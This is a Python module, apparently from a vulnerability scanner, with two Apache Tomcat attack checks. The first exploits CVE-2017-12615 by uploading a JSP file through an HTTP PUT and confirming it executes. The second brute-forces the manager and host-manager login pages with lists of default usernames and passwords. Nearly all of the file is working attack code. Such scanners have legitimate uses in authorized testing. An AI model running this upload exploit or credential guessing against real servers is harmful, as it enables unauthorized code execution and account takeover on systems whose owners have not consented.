# -*- coding: utf-8 -*-
# @File  : http_tomcat.py
# @Date  : 2019/12/20
# @Desc  :
# @license : Copyright(C), funnywolf 
# @Author: funnywolf
# @Contact : github.com/FunnyWolf

import base64

from lib.config import log_success
from vulscan.common import *


class CVE_2017_12615(object):
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
        }
        self.data = '''<%out.print("sealgod");%>'''
        self.payload_url = r'{}/{}.jsp/'.format(self.url, "justatesturlforyou")

    def check(self):
        try:
            res = requests.put(self.payload_url, data=self.data, headers=self.headers)
            code = res.status_code
            if code == 201:
                whoami = requests.get(self.payload_url[:-1]).text
                if r"sealgod" in whoami:
                    return True
                else:
                    return False
            else:
                return False
        except Exception as e:
            return False

    def confirm_info(self):
        """获取web目录"""
        return self.payload_url[:-1]


class WeakPassword(object):
    def __init__(self, url):
        self.url = url
        self.user = ["tomcat", "root", "admin", "Tomcat", "test", "manager"]
        self.password = ["tomcat", '123456', 'admin', 'root']

    def check(self):
        for u in self.user:
            for p in self.password:
                header = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Connection': 'close',
                    'Upgrade-Insecure-Requests': '1',
                    "Authorization": "Basic " + base64.b64encode(("%s:%s") % (u, p))}
                try:
                    Virtual_Host_Manager_url = self.url + "/host-manager/html"
                    reponse = requests.get(Virtual_Host_Manager_url, timeout=3, headers=header)
                    if ("Tomcat Virtual Host Manager" in reponse.text):
                        log_success("Tomcat", Virtual_Host_Manager_url, "", (u, p))
                        return True
                except Exception as e:
                    pass

                try:
                    Tomcat_Web_Application_Manager_url = self.url + "/manager/html"
                    reponse = requests.get(Tomcat_Web_Application_Manager_url, timeout=3, headers=header)
                    if ("Tomcat Web Application Manager" in reponse.text):
                        log_success("Tomcat", Tomcat_Web_Application_Manager_url, "", (u, p))
                        return True
                except Exception as e:
                    pass
        return False


if __name__ == '__main__':
    # s = CVE_2017_12615("http://192.168.8.110:8080")
    # print(s.check())
    # print(s.confirm_info())
    s = WeakPassword("http://192.168.146.10:8080")
    print(s.check())
